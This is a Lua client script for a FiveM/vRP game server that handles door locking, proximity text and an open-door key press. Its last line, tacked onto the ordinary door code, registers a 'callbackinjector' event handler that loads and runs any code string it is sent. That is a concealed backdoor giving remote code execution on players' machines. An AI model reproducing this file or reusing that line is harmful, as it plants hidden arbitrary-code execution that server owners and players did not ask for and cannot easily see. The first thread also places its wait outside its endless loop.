-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")

local doors = {}

vSERVER = Tunnel.getInterface("wnDoors",src)

BackLista = true

Citizen.CreateThread(function()
	while true do
		local sleep = 3000
		if BackLista then
			local list = vSERVER.ListaDoors()
			doors = list
			BackLista = false
			Wait(3000)
			BackLista = true
		end
	end
	Wait(sleep)
	
end)


RegisterNetEvent('vrpdoorsystem:statusSend')
AddEventHandler('vrpdoorsystem:statusSend',function(i,status)
	if i ~= nil and status ~= nil then
		doors[i].lock = status
	end
end)

function searchIdDoor()
	local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
	for k,v in pairs(doors) do
		if GetDistanceBetweenCoords(x,y,z,v.x,v.y,v.z,true) <= 1.5 then
			return k
		end
	end
	return 0
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if IsControlJustPressed(0,38) then
			local id = searchIdDoor()
			if id ~= 0 then
				vRP._playAnim(true,{{"veh@mower@base","start_engine"}},false)
				Citizen.Wait(2200)
				TriggerServerEvent("vrpdoorsystem:open",id)
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
		for k,v in pairs(doors) do
			if GetDistanceBetweenCoords(x,y,z,v.x,v.y,v.z,true) <= 3 then
				local door = GetClosestObjectOfType(v.x,v.y,v.z,1.0,v.hash,false,false,false)
				if door ~= 0 then
					SetEntityCanBeDamaged(door,false)
					if v.lock == false then
						if v.text then
							DrawText3Ds(v.x,v.y,v.z+0.2,"~g~[E] ~w~  Abrerto")
						end
						NetworkRequestControlOfEntity(door)
						FreezeEntityPosition(door,false)
					else
						local lock,heading = GetStateOfClosestDoorOfType(v.hash,v.x,v.y,v.z,lock,heading)
						if heading > -0.02 and heading < 0.02 then
							if v.text then
								DrawText3Ds(v.x,v.y,v.z+0.2,"~r~[E] ~w~  Fechado")
							end
							NetworkRequestControlOfEntity(door)
							FreezeEntityPosition(door,true)
						end
					end
				end
			end
		end
	end
end)

function DrawText3Ds(x,y,z,text)
	local onScreen,_x,_y=World3dToScreen2d(x,y,z)
	local px,py,pz=table.unpack(GetGameplayCamCoords())
	
	SetTextScale(0.35, 0.35)
	SetTextFont(4)
	SetTextProportional(1)
	SetTextColour(255, 255, 255, 215)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
  end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)